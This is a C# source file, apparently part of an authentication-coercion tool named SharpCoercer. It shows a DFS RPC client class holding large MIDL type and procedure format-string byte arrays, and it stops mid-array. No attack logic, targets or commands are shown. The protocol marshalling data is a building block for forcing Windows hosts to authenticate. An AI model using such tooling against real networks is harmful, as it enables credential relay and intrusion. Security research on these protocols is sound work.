using SharpCoercer.Abstracts;
using SharpCoercer.Helpers;
using SharpCoercer.Win32;
using SharpCoercer.Win32.Structs;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SharpCoercer.RpcClients
{
    internal class DfsRpcClient :RpcClientBase,IRpcClient
    {
        private static byte[] MIDL_TypeFormatStringx64 = new byte[] { 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x20, 0x00, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x13, 0x30, 0x01, 0x00, 0x00, 0x00, 0x70, 0x00, 0x02, 0x00, 0x00, 0x00, 0x7c, 0x00, 0x03, 0x00, 0x00, 0x00, 0x90, 0x00, 0x04, 0x00, 0x00, 0x00, 0xd4, 0x00, 0x05, 0x00, 0x00, 0x00, 0x1a, 0x01, 0x06, 0x00, 0x00, 0x00, 0x36, 0x01, 0x07, 0x00, 0x00, 0x00, 0x8e, 0x01, 0x08, 0x00, 0x00, 0x00, 0x96, 0x01, 0x09, 0x00, 0x00, 0x00, 0xc4, 0x01, 0x32, 0x00, 0x00, 0x00, 0x02, 0x02, 0x64, 0x00, 0x00, 0x00, 0x08, 0x02, 0x65, 0x00, 0x00, 0x00, 0x14, 0x02, 0x66, 0x00, 0x00, 0x00, 0x0e, 0x02, 0x67, 0x00, 0x00, 0x00, 0x12, 0x02, 0x68, 0x00, 0x00, 0x00, 0x18, 0x02, 0x69, 0x00, 0x00, 0x00, 0x20, 0x02, 0x6a, 0x00, 0x00, 0x00, 0x30, 0x02, 0x6b, 0x00, 0x00, 0x00, 0x38, 0x02, 0x96, 0x00, 0x00, 0x00, 0x5c, 0x02, 0x00, 0x00, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x36, 0x36, 0x08, 0x08, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x2e, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x40, 0x36, 0x36, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x14, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xd8, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x36, 0x36, 0x08, 0x08, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xd2, 0xff, 0x12, 0x00, 0x2a, 0x00, 0x1d, 0x00, 0x08, 0x00, 0x01, 0x5b, 0x15, 0x03, 0x10, 0x00, 0x08, 0x06, 0x06, 0x4c, 0x00, 0xf1, 0xff, 0x5b, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x28, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x92, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x36, 0x36, 0x08, 0x08, 0x4c, 0x00, 0xd0, 0xff, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xcc, 0xff, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x38, 0x00, 0x00, 0x00, 0x10, 0x00, 0x36, 0x36, 0x08, 0x08, 0x4c, 0x00, 0xac, 0xff, 0x08, 0x08, 0x08, 0x40, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x3a, 0x00, 0x15, 0x03, 0x08, 0x00, 0x0e, 0x06, 0x06, 0x5b, 0x1a, 0x03, 0x20, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x08, 0x40, 0x36, 0x36, 0x4c, 0x00, 0xea, 0xff, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x30, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xd4, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x40, 0x00, 0x00, 0x00, 0x10, 0x00, 0x36, 0x36, 0x08, 0x08, 0x4c, 0x00, 0x52, 0xff, 0x08, 0x08, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xca, 0xff, 0x12, 0x00, 0x02, 0x00, 0x15, 0x03, 0x10, 0x00, 0x4c, 0x00, 0x34, 0xff, 0x5c, 0x5b, 0x12, 0x00, 0x0e, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x30, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x48, 0x00, 0x00, 0x00, 0x12, 0x00, 0x36, 0x36, 0x08, 0x08, 0x4c, 0x00, 0x12, 0xff, 0x08, 0x08, 0x08, 0x40, 0x36, 0x08, 0x40, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xd2, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x40, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x56, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x50, 0x00, 0x00, 0x00, 0x14, 0x00, 0x36, 0x36, 0x08, 0x08, 0x4c, 0x00, 0xd4, 0xfe, 0x08, 0x08, 0x08, 0x40, 0x36, 0x08, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x92, 0xff, 0x12, 0x00, 0xc2, 0xff, 0x12, 0x00, 0x02, 0x00, 0x15, 0x07, 0x10, 0x00, 0x08, 0x08, 0x0b, 0x5b, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x02, 0x00, 0x15, 0x03, 0x04, 0x00, 0x08, 0x5b, 0x12, 0x00, 0x02, 0x00, 0x15, 0x03, 0x08, 0x00, 0x08, 0x08, 0x5c, 0x5b, 0x12, 0x00, 0x02, 0x00, 0x15, 0x03, 0x08, 0x00, 0x4c, 0x00, 0xe2, 0xfe, 0x5c, 0x5b, 0x12, 0x00, 0x02, 0x00, 0x1a, 0x03, 0x18, 0x00, 0x00, 0x00, 0x08, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0x02, 0x00, 0x15, 0x03, 0x0c, 0x00, 0x08, 0x4c, 0x00, 0xbd, 0xfe, 0x5b, 0x12, 0x00, 0x0e, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x18, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x28, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x36, 0x08, 0x08, 0x08, 0x08, 0x08, 0x40, 0x36, 0x5c, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x0e, 0x00, 0x1b, 0x00, 0x01, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0x02, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xe6, 0xff, 0x11, 0x04, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x20, 0x00, 0x01, 0x00, 0x04, 0xfd, 0x12, 0x00, 0x10, 0x02, 0x2b, 0x09, 0x09, 0x00, 0xf8, 0xff, 0x01, 0x00, 0x02, 0x00, 0x08, 0x00, 0x0a, 0x30, 0x01, 0x00, 0x00, 0x00, 0x3a, 0x00, 0x02, 0x00, 0x00, 0x00, 0x5e, 0x00, 0x03, 0x00, 0x00, 0x00, 0x82, 0x00, 0x04, 0x00, 0x00, 0x00, 0xa6, 0x00, 0x05, 0x00, 0x00, 0x00, 0xca, 0x00, 0x06, 0x00, 0x00, 0x00, 0xee, 0x00, 0x08, 0x00, 0x00, 0x00, 0x12, 0x01, 0x09, 0x00, 0x00, 0x00, 0x36, 0x01, 0xc8, 0x00, 0x00, 0x00, 0x5a, 0x01, 0x2c, 0x01, 0x00, 0x00, 0x8c, 0x01, 0xff, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x18, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x00, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x1c, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x38, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x32, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x62, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x78, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x18, 0x00, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0x8c, 0xfd, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x26, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x12, 0x00, 0x28, 0x00, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x19, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xde, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x06, 0x00, 0x08, 0x40, 0x36, 0x5b, 0x12, 0x00, 0xdc, 0xff, 0x1a, 0x03, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x40, 0x4c, 0x00, 0xe6, 0xfd, 0x5c, 0x5b, 0x12, 0x08, 0x08, 0x5c, 0x12, 0x14, 0x02, 0x00, 0x12, 0x00, 0x26, 0x00, 0x1a, 0x03, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x36, 0x5b, 0x12, 0x08, 0x25, 0x5c, 0x21, 0x03, 0x00, 0x00, 0x09, 0x00, 0xf8, 0xff, 0x01, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x4c, 0x00, 0xe0, 0xff, 0x5c, 0x5b, 0x1a, 0x03, 0x08, 0x00, 0xe6, 0xff, 0x00, 0x00, 0x08, 0x40, 0x5c, 0x5b, 0x11, 0x14, 0x90, 0xfa, 0x11, 0x08, 0x02, 0x5c, 0x11, 0x08, 0x08, 0x5c, 0x11, 0x00, 0x02, 0x00, 0x2b, 0x09, 0x29, 0x00, 0x28, 0x00, 0x01, 0x00, 0x8c, 0xfa, 0x11, 0x04, 0x02, 0x00, 0x15, 0x07, 0x20, 0x00, 0x08, 0x08, 0x0b, 0x08, 0x08, 0x0b, 0x5c, 0x5b };
        private static byte[] MIDL_ProcFormatStringx64 = new byte[] { 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x44, 0x01, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x06, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x06, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x06, 0x0a, 0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x28, 0x00, 0x0e, 0x00, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x06, 0x0a, 0x03, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x13, 0x21, 0x28, 0x00, 0x0c, 0x03, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x24, 0x00, 0x47, 0x05, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x08, 0x00, 0x08, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x1b, 0x00, 0x18, 0x00, 0x16, 0x03, 0x1a, 0x00, 0x20, 0x00, 0x38, 0x05, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x08, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x58, 0x00, 0x32, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x08, 0x00, 0x47, 0x0a, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x28, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x30, 0x00, 0x04, 0x00, 0x48, 0x00, 0x38, 0x00, 0x02, 0x00, 0x48, 0x00, 0x40, 0x00, 0x08, 0x00, 0x1b, 0x20, 0x48, 0x00, 0x3c, 0x05, 0x70, 0x00, 0x50, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x07, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x04, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x1b, 0x20, 0x30, 0x00, 0x3c, 0x05, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x04, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0d, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x70, 0x00, 0x20, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x20, 0x00, 0x04, 0x00, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x35, 0x00, 0x3d, 0x00, 0x47, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x1b, 0x20, 0x10, 0x00, 0x74, 0x05, 0x58, 0x01, 0x18, 0x00, 0x02, 0x00, 0x58, 0x01, 0x20, 0x00, 0x08, 0x00, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x30, 0x00, 0x32, 0x00, 0x00, 0x00, 0x10, 0x00, 0x08, 0x00, 0x46, 0x05, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x48, 0x00, 0x20, 0x00, 0x08, 0x00, 0x70, 0x00, 0x28, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x12, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x03, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x70, 0x00, 0x18, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x13, 0x00, 0x48, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x08, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x18, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x28, 0x00, 0x06, 0x00, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x1b, 0x20, 0x38, 0x00, 0x3c, 0x05, 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x14, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x06, 0x00, 0x1b, 0x20, 0x28, 0x00, 0x3c, 0x05, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x15, 0x00, 0x38, 0x00, 0x32, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x24, 0x00, 0x47, 0x06, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x48, 0x00, 0x10, 0x00, 0x08, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x1b, 0x00, 0x20, 0x00, 0x16, 0x03, 0x1a, 0x00, 0x28, 0x00, 0x38, 0x05, 0x70, 0x00, 0x30, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x48, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x47, 0x08, 0x0a, 0x07, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x04, 0x00, 0x0b, 0x01, 0x10, 0x00, 0x04, 0x00, 0x0b, 0x00, 0x18, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x06, 0x00, 0x48, 0x00, 0x28, 0x00, 0x08, 0x00, 0x0b, 0x01, 0x30, 0x00, 0x84, 0x05, 0x1b, 0x20, 0x38, 0x00, 0x3c, 0x05, 0x70, 0x00, 0x40, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x17, 0x00, 0x40, 0x00, 0x32, 0x00, 0x00, 0x00, 0x15, 0x00, 0x08, 0x00, 0x46, 0x07, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x48, 0x00, 0x18, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x20, 0x00, 0x06, 0x00, 0x48, 0x00, 0x28, 0x00, 0x02, 0x00, 0x48, 0x00, 0x30, 0x00, 0x08, 0x00, 0x70, 0x00, 0x38, 0x00, 0x08, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x28, 0x00, 0x32, 0x00, 0x00, 0x00, 0x08, 0x00, 0x08, 0x00, 0x46, 0x04, 0x0a, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x08, 0x00, 0x06, 0x00, 0x0b, 0x00, 0x10, 0x00, 0x06, 0x00, 0x48, 